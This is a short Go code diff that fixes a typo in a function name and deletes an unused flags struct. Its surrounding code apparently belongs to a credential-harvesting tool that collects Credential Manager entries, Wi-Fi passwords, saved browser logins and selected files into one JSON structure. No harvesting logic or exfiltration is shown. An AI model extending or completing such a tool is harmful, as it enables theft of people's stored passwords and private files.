@@ -37,7 +37,7 @@ func ExtractCredmanData() ([]common.NamePass, int) {
 	return nil, 0
 }
 
-func ExtractInterstingFiles() []string{
+func ExtractInterestingFiles() []string{
 	var data = filesystem.FindFiles()
 	return data
 }
@@ -46,10 +46,6 @@ type AllDataStruct struct {
 	WifiData    []common.NamePass    `json:"wifi"`
 	BrowserData []common.UrlNamePass `json:"browser"`
 	CredmanData []common.NamePass    `json:"credman"`
-}
-
-type CommonStructFlags struct {
-	Debug bool
 }
 
 func ExtractAllData() (AllDataStruct, int) {
